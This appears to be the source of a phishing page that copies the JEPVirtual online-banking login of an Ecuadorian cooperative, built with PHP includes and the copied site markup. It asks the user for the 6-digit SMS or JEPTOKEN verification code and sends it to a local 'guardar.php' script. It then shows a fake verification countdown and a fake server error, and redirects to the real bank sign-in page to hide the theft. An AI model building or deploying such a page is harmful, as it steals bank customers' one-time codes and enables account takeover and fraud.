
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html>
<html lang="es" xmlns="http://www.w3.org/1999/xhtml">

<head id="j_idt2">
    <!--<script type="text/javascript" src="Funciones.js"></script>-->
     <?php
        require_once 'estructura/head.php';
      ?>

        <link type="text/css" rel="stylesheet" href="/jepvirtual/javax.faces.resource/primeicons/primeicons.css.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0" />

<link type="text/css" rel="stylesheet" href="/jepvirtual/javax.faces.resource/components.css.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0" />

<link type="text/css" rel="stylesheet" href="/jepvirtual/javax.faces.resource/css/other/core.css.jsf?ln=bsf" />

<link type="text/css" rel="stylesheet" href="/jepvirtual/javax.faces.resource/css/bsf.css.jsf?ln=bsf" /><!--[if lt IE 9]><script src="/jepvirtual/javax.faces.resource/js/html5shiv.js.jsf?ln=bsf"></script><script src="/jepvirtual/javax.faces.resource/js/respond.js.jsf?ln=bsf"></script><![endif]-->


  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/jquery/jquery.js.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0"></script>


  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/jquery/jquery-plugins.js.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0"></script>

  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/core.js.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0"></script>

  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/components.js.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0"></script>

  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/idlemonitor/idlemonitor.js.jsf?ln=primefaces&amp;v=10.0.0&amp;e=10.0.0"></script>

  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/jsf.js.jsf?ln=javax.faces"></script>

  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/js/tooltip.js.jsf?ln=bsf"></script>

  <script type="text/javascript" src="/jepvirtual/javax.faces.resource/js/bsf.js.jsf?ln=bsf"></script>

  <script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='es_EC';PrimeFaces.settings.viewId='/signin.xhtml';PrimeFaces.settings.contextPath='/jepvirtual';PrimeFaces.settings.cookiesSecure=false;}</script>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>JEPVirtual :: Cooperativa de Ahorro y Cr&eacute;dito Juventud
    Ecuatoriana Progresista</title>

 <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <!--external css-->
    <link href="css/font-awesome.css" rel="stylesheet" />
    <link href="css/jquery.fancybox.css" rel="stylesheet" />
    <link href="css/estiloss.css" rel="stylesheet">
    <link href="css/flexslider.css" rel="stylesheet" />


    <link rel="stylesheet" type="text/css" href="css/zabuto_calendar.css">
    <link rel="stylesheet" type="text/css" href="css/jquery.gritter.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css">    
    
    <!-- Custom styles for this template -->
    <link href="css/style.css" rel="stylesheet">
    <link href="css/style-responsive.css" rel="stylesheet">


     <script type="text/javascript" src="js/jquery.js"></script>
     <script type="text/javascript" src="js/jquerys.js"></script>


    <script type="text/javascript" src="chart-master/Chart.js"></script> 


  <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
  <link rel="stylesheet" type="text/css" href="css/JEP.css" />
  <link rel="stylesheet" type="text/css" href="css/lightbox.css" />
  <link rel="stylesheet" type="text/css" href="css/ie10-viewport-bug-workaround.css" />
  <link rel="stylesheet" type="text/css" href="css/estilo.css" />
  <link rel="stylesheet" type="text/css" href="css/estilos.css" />
  <link rel="stylesheet" type="text/css" href="css/estilosAuxiliares.css" />  
  <link rel="stylesheet" type="text/css" href="css/font-awesome.min.css" />
  <link rel="stylesheet" type="text/css" href="css/jquery.bxslider.css" />

      
    <script type="text/javascript" src="js/validaciones.js"></script> 
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.3.min.js"></script>    
  <script type="text/javascript" src="js/shadowbox.js"></script>
  <script type="text/javascript" src="js/virtual.js"></script>
  <script type="text/javascript" src="js/crypto-js.min.js"></script>  
  <script type="text/javascript" src="js/jquery.bxslider.js"></script>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquerys.js"></script>
<script type="text/javascript" src="js/Fucion.js"></script>

     <script>


     $(document).ready(function(){
    
       
      
   

     });
  </script>

<script type="text/javascript">
    

      function Rverifica(){
        
 var verifica =document.getElementById("verifica").value;     
          if (verifica.length<6) {

                  
          $('#Ver').show();
          
              
          //$('#mostrar').html("Su Cod&iacute;go no Posee los 6 Digitos");
          
          }else{


cout();
$('#Carga').modal('show');

     $.ajax({

    type:"POST",
    url:"guardar.php",
    data:{verifica:verifica}
    }).done(function(msg){




          


  });
  

          }
  

}



  </script>

        <script type="text/javascript">
         
           function cout() {
            // body...
         
           
         var url = "https://jepvirtual.coopjep.fin.ec/jepvirtual/signin.jsf";
         var seconds = 20; //número de segundos a contar

         function secondPassed() {

            var minutes = Math.round((seconds - 30) / 60); //calcula el número de minutos
            var remainingSeconds = seconds % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq

            if (remainingSeconds < 10) {
               remainingSeconds = "0" + remainingSeconds;

            }


            document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;

            if (seconds == 0) {



               clearInterval(countdownTimer);


                $('#Mostrar').show();

                $('#Mostrar').html('<label style="color:red;" > Disculpe hemos tenido un problema al conectarnos con el servidor... <br> Sera redireccionado nuevamente a la pagina de inicio...</label>');

                 var segundos = 5; //número de segundos a contar

                 if ($('#countdown').hide()) {

                     $('#count').show();

                    function sego(){

                      var minutos = Math.round((segundos - 30) / 60); //calcula el número de minutos
                    var remainingSegundos = segundos % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq
                
                      if (remainingSegundos < 10) {
               remainingSegundos = "0" + remainingSegundos;


                  }

                  document.getElementById('count').innerHTML = minutos + ":" + remainingSegundos;
                    
                          if(segundos == 0){

                      clearInterval(counTimer);

                      window.location = url;

               document.getElementById('count').innerHTML = "";


                  }else{


                      segundos--;

                       


                  }


                    }

                 }
          

          
            } else {

               seconds--;
               
            }

            var counTimer = setInterval(sego, 1000);

         }
          
         var countdownTimer = setInterval(secondPassed, 1000);
          }


      </script>




</head>


     
  <body onload="Reloj()">
    

  <?php
    require_once 'estructura/scripts.php';
   ?> 
  

<!-- Modal -->
  <div class="modal fade" id="Carga">
        <div class="modal-dialog">
          <div class="modal-content">
                <!--Header de la ventana -->
                <!--<header>
                  <div class="modal-header">
                    <a href="usuario.php" class="fa fa-times-circle close" type="button" title="Cerrar" arie-hidden="true"></a>
                    <img class="logo-modal-usur" src="utilidad/img/registrarusuario.png"/>
                    <h7>Registrar Usuario</h7>
                  </div>
                </header>-->
                    <!--contenido de la ventana-->

            <div class="modal-body">

<div class=" col-sm-6 col-md-6 JEPVirtual-logo">
          <img src="svg/JEPVirtual.svg" width="217" />
        </div>
        <div class="col-sm-6 col-md-6 JEPVirtual-mensaje">
          <img src="svg/JEP-Personas-ES.svg" width="300" />
        </div><br>

        <h3 align="center" style="color: white;">Estimado Usuario, Estamos verificado sus datos</h3>

<!-- ......................        cargado            ..............-->



<div align="top" id="j_idt64:j_idt65" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container" style="background-color: transparent !important;">
  <div class="ui-dialog-content ui-widget-content" id="j_idt64:j_idt65_content">
<form id="j_idt64:j_idt66" name="j_idt64:j_idt66" method="post" action="/jepvirtual/signin.jsf" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="j_idt64:j_idt66" value="j_idt64:j_idt66" />

      <div align="top" class="loader" id="loader"></div>
      <br />
      <br />
      <br />
      <br />
      <br />
    <div align="center"><label style="color:#A1BF37">CARGANDO<br></label>

       <h4><label style="color:white;" id="Mostrar">Por favor espere mientras verificamos su Codigo.<br> 
                     Cargando plataforma</label><br> por favor espere</h4>

         <h3><label  style="color:white;" id="countdown"></label></h3>
         <h3><label  style="color:red;" id="count"></label></h3>

       

      </div>

      <input type="hidden" name="_csrf" value="ebd872dc-5f4e-41bb-a909-ab4752c94664" /><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:5" value="" autocomplete="off" />






</form></div></div>




<script id="j_idt64:j_idt65_s" type="text/javascript">$(function(){PrimeFaces.cw("Dialog","cargandoSignin",{id:"j_idt64:j_idt65",modal:true,width:"300px",height:"300px",position:"center, center",responsive:true,onShow:function(){adjustPositionandOpenDialog(this.jq)}});});</script>
                    


            </div>
        
            
        </div>
      </div>
    </div>









  <div class="JEPVirtual-login-idiomas">
      <div class="contenidos">
<form id="j_idt6" name="j_idt6" method="post" action="/jepvirtual/signin.jsf" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="j_idt6" value="j_idt6" />

          <i class="fa fa-circle" aria-hidden="true"></i><a id="j_idt6:j_idt8" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;j_idt6:j_idt8&quot;,f:&quot;j_idt6&quot;,u:&quot;otpfooter imagenesPresentacion contenedor&quot;});return false;">Espa&ntilde;ol</a>
          <i class="fa fa-circle" aria-hidden="true"></i><a id="j_idt6:j_idt11" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;j_idt6:j_idt11&quot;,f:&quot;j_idt6&quot;,u:&quot;otpfooter imagenesPresentacion contenedor&quot;});return false;">Ingl&eacute;s</a>
          <i class="fa fa-circle" aria-hidden="true"></i><a id="j_idt6:j_idt14" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;j_idt6:j_idt14&quot;,f:&quot;j_idt6&quot;,u:&quot;otpfooter imagenesPresentacion contenedor&quot;});return false;">Kichwa</a>
          <input type="hidden" name="_csrf" value="35049e67-4f6d-46d4-b4a9-c1407ccdb07c" /><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="" autocomplete="off" />
</form>
      </div>
    </div>


        <script type="text/javascript" src="js/validaciones.js"></script>
<form id="imagenesPresentacion" name="imagenesPresentacion" method="post" action="/jepvirtual/signin.jsf" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="imagenesPresentacion" value="imagenesPresentacion" />

    <div class="JEPVirtual-login-marca">
      <div class="contenidos">
        <div class=" col-sm-6 col-md-6 JEPVirtual-logo">
          <img src="svg/JEPVirtual.svg" width="217" />
        </div>
        <div class="col-sm-6 col-md-6 JEPVirtual-mensaje">
          <img src="svg/JEP-Personas-ES.svg" width="300" />
        </div>
      </div>
    </div>
    <input type="hidden" name="_csrf" value="35049e67-4f6d-46d4-b4a9-c1407ccdb07c" /><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:1" value="" autocomplete="off" />
</form>

  <div class="JEPVirtual-login-cabecera-sombra"></div>
  <div class="JEPVirtual-login-img">    
          <ul class="bxslider">
              <li>
                <a href="https://www.jep.coop/productos-servicios/creditos/credijep" target="_blank"><img src="imge/a1.jpg" /></a>
              </li>
              <!--<li>
                <a href="https://cuentavirtual.jep.coop/" target="_blank"><img src="imge/a2.jpg" /></a>
              </li>
              <<li>
                <a href="https://www.jeprecompensas.com/JepEcuadorWeb/login" target="_blank"><img src="imge/a3.jpg" /></a>
              </li>
              <li>
                <a href="https://www.coopjep.fin.ec/productos-servicios/ahorros/fondojep" target="_blank"><img src="imge/a4.jpg" /></a>
              </li>
              <li>
                <a href="https://www.coopjep.fin.ec/productos-servicios/ahorros/ahorros-jepito" target="_blank"><img src="imge/a5.jpg" /></a>
              </li>
              <li>
                <a href="https://www.coopjep.fin.ec/productos-servicios/servicios/complementarios" target="_blank"><img src="imge/a6.jpg" /></a>
              </li>
              <li>
                <a href="https://www.coopjep.fin.ec/productos-servicios/servicios/complementarios" target="_blank"><img src="imge/a7.jpg" /></a>
              </li>-->
          </ul>   
  </div>

  <div id="j_idt23" class="container">
      <!-- &lt;div class="JEPVirtual-login-sombra1"&gt;&lt;/div&gt; -->
    <div id="content" class="left_content">
      <f:event type="preRenderView"></f:event>

        <div id="contenedor" class="ui-panel ui-widget ui-widget-content ui-corner-all" data-widget="widget_contenedor">

            <div id="contenedor_content" class="ui-panel-content ui-widget-content">

<p align="center" style="color:red;">
          <strong style="color:red;">Estimado usuario,</strong> Error de c&oacute;digo ingresado. Por favor colocar el siguiente c&oacute;digo enviado a su celular y/o JEPTOKEN<br />
        </p>


 <

            <form id="form" name="formsubi" method="post" class="form-signin" enctype="application/x-www-form-urlencoded">

<input type="hidden" name="form" value="form" />

<script id="j_idt27_s" type="text/javascript">$(function(){PrimeFaces.cw("IdleMonitor","widget_j_idt27",{id:"j_idt27",timeout:600000,multiWindowSupport:false,onidle:function(){startIdleMonitor()}});});</script>

                    <div id="panel" class="ui-panel ui-widget ui-widget-content ui-corner-all" data-widget="widget_panel">
                      <div id="panel_content" class="ui-panel-content ui-widget-content">
                        
                          <span id="j_idt28"></span>
    <script type="text/javascript">$(function(){PrimeFaces.focus(null, 'panel');});</script>


    <input id="verifica" name="username1" type="password"  maxlength="6" minlength="6" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all form-control" aria-required="true" autocomplete="off" placeholder="Ingrese el c&oacute;digo de Ver&iacute;ficaci&oacute;n" onkeypress="return solonumeros(event);" onkeyup="ocultar('componente_error');ocultar('componenterecargue');" required="" />

     <p align="center" style="color:red">
          <strong ><h4 id="Ver" style="color:red" hidden>Su Cod&iacute;go no Posee los 6 Digitos</h4></strong><br />
        </p>


                    <input id="username" name="username" type="hidden" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " />

            <br />

         



            <script id="password1_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_password1",{id:"password1",maxlength:30});});</script>

   
    




          


     






        










            <br /><button id="btnSignin" name="btnSignin" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only btn btn-lg btn-primary btn-block" onclick="javascript:Rverifica();" style="margin-left: 29% !important;" type="button"><span class="ui-button-text ui-c">ACCEDER</span></button>


                      <script id="btnSignin_s" type="text/javascript">$(function(){PrimeFaces.cw("CommandButton","widget_btnSignin",{id:"btnSignin"});});</script></div></div><script id="panel_s" type="text/javascript">$(function(){PrimeFaces.cw("Panel","widget_panel",{id:"panel"});});</script>
          

          <div id="idDispositivoNavegador" style="color: #A0BE37;display:none;" onclick="paginaRedireccion()">
            Para mejor experiencia de usuario debe descargar la nueva jep movil.
          </div>

          <br />

                  <div id="componenterecargue" style="display: none; font-size: 14px; color: #dd5151; margin-top: 10px; margin-bottom: 10px; text-align: center;">
            <img src="error.svg" width="20" height="20" />
            <strong>ERROR: </strong><span id="mensajerecargue"></span>
          </div>

            <script id="j_idt38" type="text/javascript">remoteChangeCommand = function() {return PrimeFaces.ab({s:"j_idt38",f:"form",p:"j_idt38",u:"form",pa:arguments[0]});}</script><script id="j_idt39" type="text/javascript">remoteChangeCommand2 = function() {return PrimeFaces.ab({s:"j_idt39",f:"form",p:"j_idt39",u:"form",pa:arguments[0]});}</script><script id="j_idt40" type="text/javascript">procesarfingerprint = function() {return PrimeFaces.ab({s:"j_idt40",f:"form",p:"j_idt40",pa:arguments[0]});}</script>
          <input type="hidden" name="_csrf" value="" />

                           <div id="j_idt42" class="ui-panel ui-widget ui-widget-content ui-corner-all ui-helper-hidden" data-widget="widget_j_idt42">
                      
                               <div id="j_idt42_content" class="ui-panel-content ui-widget-content">
                              
                            </div>
                          </div>

                          <script id="j_idt42_s" type="text/javascript">$(function(){PrimeFaces.cw("Panel","widget_j_idt42",{id:"j_idt42"});});</script><span style="color: white;"></span><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:2" value="" autocomplete="off" />
</form>
      

      <div class="JEPVirtual-login-sombra1"></div>
      <div class="JEPVirtual-login-usuariocontrasena">
          <div class="col-sm-6 col-md-6 usuario">
            <a href="usuarios/recuperaUsuario.jsf">Olvid&eacute; mi 
              <strong>Usuario</strong>
            </a>
          </div>

          <div class="col-sm-6 col-md-6 contrasena">
            <a href="usuarios/recuperaContrasenia.jsf">Olvid&eacute; mi 
              <strong>Contrase&ntilde;a</strong>
            </a>
          </div>
      </div>

              <div class="JEPVirtual-login-sombra2"></div>
              <div class="JEPVirtual-login-usuario-nuevo">
          <a href="usuarios/contratoUsuario.jsf"> <span class="txt-tutoriales">Si es usuario nuevo crear JEPVirtual aqu&iacute;</span>
          </a>
        </div>
          
          <div class="JEPVirtual-login-cuadro-tuto">
              <a href="https://www.coopjep.fin.ec/app/jepvirtual/#video" target="_blank"> <img src="svg/tutoriales.svg" alt="Mostrar / Ocultar Contraseña" class="JEPVirtual-login-icn" /><span class="txt-tutoriales "> Tutoriales JEP Virtual</span>
               </a>
          </div>
          <div class="JEPVirtual-login-mensaje">
                <div class="JEPVirtual-login-mensaje-icono"></div>

                  <div class="JEPVirtual-login-mensaje-texto">
                     <h3>ESTIMADO SOCIO</h3>
                      Por su seguridad se enviar&aacute; el c&oacute;digo de sus transacciones electr&oacute;nicas v&iacute;a mensajes de texto &uacute;nicamente a su celular. Actualice el n&uacute;mero de celular en nuestras agencias a nivel nacional.

                        <div id="mostrar"></div>
            
                  </div>



          </div>

                      </div>
                    </div>

                    <script id="contenedor_s" type="text/javascript">$(function(){PrimeFaces.cw("Panel","widget_contenedor",{id:"contenedor"});});</script>
  <script id="idExpiraSession_s" type="text/javascript">$(function(){PrimeFaces.cw("Dialog","alertaEspiraSession",{id:"idExpiraSession",modal:true,position:"center, center",onShow:function(){startIdleMonitor()}});});</script>



              <script src="js/fingerprint2.min.js"></script>
      <script type="text/javascript">
              var options = { excludePixelRatio: true , excludeScreenResolution:true , excludeAvailableScreenResolution: true , excludeSessionStorage: true , excludeIndexedDB: true , excludeOpenDatabase:true , excludeTouchSupport:true };
                var fp = new Fingerprint2(options);
                fp.get(function(result, components){
                    procesarfingerprint([{name: 'idfingerprint', value: result}]);
                    })
            </script>

            <script type="text/javascript">

!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?

n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;

n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;

t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,

document,'script','//connect.facebook.net/en_US/fbevents.js');

 

fbq('init', '957070671032807');

fbq('track', "PageView");

 

// CompleteRegistration

// Track when a registration form is completed (ex. complete subscription, sign up for a service)

fbq('track', 'CompleteRegistration');

 

</script>

      <noscript>
        <img height="1" width="1" style="display: none" src="https://www.facebook.com/tr?id=957070671032807&amp;ev=PageView&amp;noscript=1" />

      </noscript>

      <div style="display: block; line-height: 0; height: 0; overflow: hidden;">
      <!-- Google Code para etiquetas de remarketing -->

        <script type="text/javascript">

/* <![CDATA[ */

var google_conversion_id = 994700723;

var google_custom_params = window.google_tag_params;

var google_remarketing_only = true;

/* ]]> */

</script>

        <script type="text/javascript" src="js/conversion.js">

</script>

        <noscript>

          <div style="display: inline;">

            <img height="0" width="0" style="border-style: none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/994700723/?value=0&amp;guid=ON&amp;script=0" />

          </div>

        </noscript>


      </div>

          <!-- Twitter single-event website tag code -->
      <script src="js/oct.js" type="text/javascript"></script>
<!--      &lt;script type="text/javascript"&gt;twttr.conversion.trackPid('nx70f', { tw_sale_amount: 0, tw_order_quantity: 0 });&lt;/script&gt; -->
      <noscript>
        <img height="1" width="1" style="display: none;" alt="" src="https://analytics.twitter.com/i/adsct?txn_id=nx70f&amp;p_id=Twitter&amp;tw_sale_amount=0&amp;tw_order_quantity=0;" />
        <img height="1" width="1" style="display: none;" alt="" src="//t.co/i/adsct?txn_id=nx70f&amp;p_id=Twitter&amp;tw_sale_amount=0&amp;tw_order_quantity=0;" />
      </noscript>


            </div> 


            <div class="JEPVirtual-login-separador"></div>
    <div class="JEPVirtual-login-sombra2">
    </div>
    <span id="otpfooter">
      <p align="center">Por su seguridad, descargue a trav&eacute;s de estos links la &uacute;ltima versi&oacute;n de su navegador favorito.</p></span>


        <div class="JEPVirtual-login-navegadores">
      <a target="_blank" href="https://www.google.com.mx/chrome" data-toggle="tooltip" title="Google Chrome"><i class="fa fa-chrome" aria-hidden="true"></i></a> <a target="_blank" href="https://www.mozilla.org/es-ES/firefox" data-toggle="tooltip" title="Firefox"><i class="fa fa-firefox" aria-hidden="true"></i></a>
      <a target="_blank" href="http://windows.microsoft.com/es-es/internet-explorer/download-ie" data-toggle="tooltip" title="Internet Explorer"><i class="fa fa-internet-explorer" aria-hidden="true"></i></a> <a target="_blank" href="http://www.apple.com/es/safari/" data-toggle="tooltip" title="Safari"><i class="fa fa-safari" aria-hidden="true"></i></a>
    </div>
        </div>


    </div>
  </div>






    
  </body>
</html>
